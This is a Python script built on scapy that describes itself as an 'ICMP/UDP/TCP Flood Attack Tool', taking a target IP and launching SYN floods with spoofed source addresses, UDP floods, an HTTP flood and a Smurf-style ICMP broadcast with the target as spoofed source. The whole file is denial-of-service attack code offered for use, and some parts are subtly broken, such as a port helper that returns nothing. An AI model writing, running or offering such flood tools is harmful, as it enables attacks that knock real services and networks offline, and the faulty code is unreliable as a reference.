from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser

data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# ICMP/UDP/TCP Flood Attack Tool
def main():
    parser = ArgumentParser()
    parser.add_argument("--SynFlood", "-s", action='store_true', help="Syn Flood Attack")
    parser.add_argument("--UDPFlood", "-u", action='store_true', help="UDP Flood Attack")
    parser.add_argument("--ICMPFlood", "-i", action='store_true', help="ICMP Flood Attack")
    parser.add_argument("--HTTPFlood", "-H", action='store_true', help="HTTP Flood Attack")
    parser.add_argument("--target", "-t", required=True, help="target IP address")
    parser.add_argument("--port", "-p", default=80, help="target port number")
    parser.add_argument(
        "--repeat", "-r", default=100, help="attack number of repetition"
    )

    args = parser.parse_args()
    
    dstIP = args.target
    dstPort = args.port
    repeat = args.repeat

    if args.SynFlood:
        SynFlood(dstIP, dstPort, repeat)
    elif args.UDPFlood:
        UDPFlood(dstIP, repeat)
    elif args.ICMPFlood:
        ICMPFlood(dstIP, repeat)
    elif args.HTTPFlood:
        HTTPFlood(dstIP, dstPort, repeat)
    else:
        print("Attack Type is Missing")
        return

def randomSrcIP():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip 
def randomPort():
    port = randint(0, 65535)

def SynFlood(dstIP,dstPort,repeat):
    for x in range(int(repeat)):
        IP_Packet = IP()
        IP_Packet.src = randomSrcIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = 80 # default port : 20
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"

        send(IP_Packet/TCP_Packet,verbose=0)

def HTTPFlood(dstIP,dstPort,repeat):
    for x in range(int(repeat)):
        IP_Packet = IP()
        IP_Packet.dst = dstIP
        IP_Packet.src = randomPort()
        IP_Packet.ack = 0

        TCP_Packet = TCP()
        TCP_Packet.dport = dstPort
        TCP_Packet.flags="S"
        packet_SynAck = sr1(IP_Packet/TCP_Packet)

        print(packet_SynAck)
        TCP_Packet.flags="A"
        TCP_Packet.seq = packet_SynAck[TCP].ack
        TCP_Packet.sport=packet_SynAck[TCP].dport
        TCP_Packet.ack= packet_SynAck[TCP].seq+1
        getStr='GET / HTTP/1.0\n\n'
        reply = send(IP_Packet/TCP_Packet/getStr)
        

def UDPFlood(dstIP,repeat):
    for x in range(int(repeat)):
        IP_Packet = IP()
        IP_Packet.src = randomSrcIP()
        IP_Packet.dst = dstIP

        UDP_Packet = UDP()
        UDP_Packet.dport = randomPort()
        send(IP_Packet/UDP_Packet/Raw(load=data))

def ICMPFlood(dstIP,repeat):
    for x in range(int(repeat)):
        IP_Packet = IP()
        IP_Packet.src = dstIP
        IP_Packet.dst = "255.255.255.255"
        ICMP_Packet = ICMP()
        send(IP_Packet/ICMP(),verbose=0)

main()
